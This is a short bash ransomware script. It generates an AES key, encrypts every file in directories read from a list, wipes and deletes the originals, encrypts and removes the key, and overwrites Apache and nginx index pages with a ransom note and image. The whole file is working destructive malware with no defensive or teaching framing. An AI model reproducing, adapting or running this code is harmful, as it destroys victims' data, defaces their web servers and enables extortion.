#!/bin/bash

LIST=list
RANSOM=ransom.html
IMAGE=bg.jpg
WKEY=whiteKey
CIPHER=./whiteCipher
KEY=key
openssl rand -hex 16 > $KEY

for LOCATION in $(cat $LIST)
do
	for FILE in $(find $LOCATION -type f)
	do
		openssl aes-128-cbc -salt -pass file:"$KEY" -in "$FILE" -out "$FILE.enc" && cat /dev/null > "$FILE" && rm -rf "$FILE"
	done
done

"$CIPHER" -key "$WKEY" -in "$KEY" -out "$KEY.enc" | cut -d ' ' -f 2 | head -n 1 > "$KEY.iv" && cat /dev/null > "$KEY" && rm -rf "$KEY"

APACHE=/var/www
NGINX=/usr/share/nginx

APACHEs=$(find $APACHE -name index.*)
NGINXes=$(find $NGINX -name index.*)

PAGES="$APACHEs $NGINXes"

chmod 777 $IMAGE

for PAGE in $PAGES
do
	cp $RANSOM ${PAGE%.*}
	chmod 777 ${PAGE%.*}
	cp $IMAGE ${PAGE%/*}
done

